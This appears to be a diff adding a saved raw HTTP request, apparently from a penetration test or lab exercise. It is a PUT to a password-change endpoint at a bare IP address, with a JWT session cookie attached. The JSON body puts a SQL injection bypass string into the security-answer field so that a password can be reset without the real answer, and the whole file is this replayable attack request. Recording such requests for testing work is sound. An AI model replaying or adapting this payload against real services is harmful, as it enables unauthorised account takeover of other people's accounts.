@@ -1,0 +1,13 @@
+PUT /change_password HTTP/1.1
+Host: 167.172.75.216
+Content-Length: 86
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://167.172.75.216
+Referer: http://167.172.75.216/profile
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlRlc3QxMjM0NTY3OCIsImlhdCI6MTcxNzA3ODQ1OH0.r4zlunjIWMKWRR_wOvfD1P7aG_4gRQXgxODL-Ig7QbM; username=Test12345678
+
+{"new_password":"Test12345678;","secret_answer":"'or+1=1--","username":"Test12345678"}
